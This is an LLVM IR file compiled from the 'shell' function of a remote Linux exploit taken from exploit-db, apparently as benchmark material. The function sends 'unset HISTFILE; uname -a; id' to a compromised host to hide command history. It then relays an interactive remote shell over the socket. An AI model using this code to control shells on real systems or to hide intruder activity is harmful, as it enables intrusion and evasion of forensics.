; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_652.c_shell.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_652.c_shell.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [57 x i8] c"unset HISTFILE; echo \22*** Hobareeeey! ***\22;uname -a;id;\0A\00", align 1
@FD_SETSIZE = common dso_local global i32 0, align 4
@stderr = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [5 x i8] c"EOF\0A\00", align 1
@.str.2 = private unnamed_addr constant [19 x i8] c"Connection lost.\0A\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @shell(i32 %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca [1024 x i8], align 16
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
  store i8* getelementptr inbounds ([57 x i8], [57 x i8]* @.str, i64 0, i64 0), i8** %5, align 8
  %7 = call i32 @FD_ZERO(i32* %3)
  %8 = load i32, i32* %2, align 4
  %9 = call i32 @FD_SET(i32 %8, i32* %3)
  %10 = call i32 @FD_SET(i32 0, i32* %3)
  %11 = load i32, i32* %2, align 4
  %12 = load i8*, i8** %5, align 8
  %13 = load i8*, i8** %5, align 8
  %14 = call i32 @strlen(i8* %13)
  %15 = call i64 @send(i32 %11, i8* %12, i32 %14, i32 0)
  br label %16

16:                                               ; preds = %1, %63
  %17 = load i32, i32* %2, align 4
  %18 = call i32 @FD_SET(i32 %17, i32* %3)
  %19 = call i32 @FD_SET(i32 0, i32* %3)
  %20 = load i32, i32* @FD_SETSIZE, align 4
  %21 = call i64 @select(i32 %20, i32* %3, i32* null, i32* null, i32* null)
  %22 = icmp slt i64 %21, 0
  br i1 %22, label %23, label %24

23:                                               ; preds = %16
  br label %65

24:                                               ; preds = %16
  %25 = load i32, i32* %2, align 4
  %26 = call i64 @FD_ISSET(i32 %25, i32* %3)
  %27 = icmp ne i64 %26, 0
  br i1 %27, label %28, label %44

28:                                               ; preds = %24
  %29 = load i32, i32* %2, align 4
  %30 = getelementptr inbounds [1024 x i8], [1024 x i8]* %4, i64 0, i64 0
  %31 = call i32 @recv(i32 %29, i8* %30, i32 1024, i32 0)
  store i32 %31, i32* %6, align 4
  %32 = icmp slt i32 %31, 0
  br i1 %32, label %33, label %37

33:                                               ; preds = %28
  %34 = load i32, i32* @stderr, align 4
  %35 = call i32 @fprintf(i32 %34, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.1, i64 0, i64 0))
  %36 = call i32 @exit(i32 2) #3
  unreachable

37:                                               ; preds = %28
  %38 = getelementptr inbounds [1024 x i8], [1024 x i8]* %4, i64 0, i64 0
  %39 = load i32, i32* %6, align 4
  %40 = call i64 @write(i32 1, i8* %38, i32 %39)
  %41 = icmp slt i64 %40, 0
  br i1 %41, label %42, label %43

42:                                               ; preds = %37
  br label %65

43:                                               ; preds = %37
  br label %44

44:                                               ; preds = %43, %24
  %45 = call i64 @FD_ISSET(i32 0, i32* %3)
  %46 = icmp ne i64 %45, 0
  br i1 %46, label %47, label %63

47:                                               ; preds = %44
  %48 = getelementptr inbounds [1024 x i8], [1024 x i8]* %4, i64 0, i64 0
  %49 = call i32 @read(i32 0, i8* %48, i32 1024)
  store i32 %49, i32* %6, align 4
  %50 = icmp slt i32 %49, 0
  br i1 %50, label %51, label %55

51:                                               ; preds = %47
  %52 = load i32, i32* @stderr, align 4
  %53 = call i32 @fprintf(i32 %52, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.1, i64 0, i64 0))
  %54 = call i32 @exit(i32 2) #3
  unreachable

55:                                               ; preds = %47
  %56 = load i32, i32* %2, align 4
  %57 = getelementptr inbounds [1024 x i8], [1024 x i8]* %4, i64 0, i64 0
  %58 = load i32, i32* %6, align 4
  %59 = call i64 @send(i32 %56, i8* %57, i32 %58, i32 0)
  %60 = icmp slt i64 %59, 0
  br i1 %60, label %61, label %62

61:                                               ; preds = %55
  br label %65

62:                                               ; preds = %55
  br label %63

63:                                               ; preds = %62, %44
  %64 = call i32 @usleep(i32 10)
  br label %16

65:                                               ; preds = %61, %42, %23
  %66 = load i32, i32* @stderr, align 4
  %67 = call i32 @fprintf(i32 %66, i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.2, i64 0, i64 0))
  %68 = call i32 @exit(i32 0) #3
  unreachable
}

declare dso_local i32 @FD_ZERO(i32*) #1

declare dso_local i32 @FD_SET(i32, i32*) #1

declare dso_local i64 @send(i32, i8*, i32, i32) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i64 @select(i32, i32*, i32*, i32*, i32*) #1

declare dso_local i64 @FD_ISSET(i32, i32*) #1

declare dso_local i32 @recv(i32, i8*, i32, i32) #1

declare dso_local i32 @fprintf(i32, i8*) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i64 @write(i32, i8*, i32) #1

declare dso_local i32 @read(i32, i8*, i32) #1

declare dso_local i32 @usleep(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
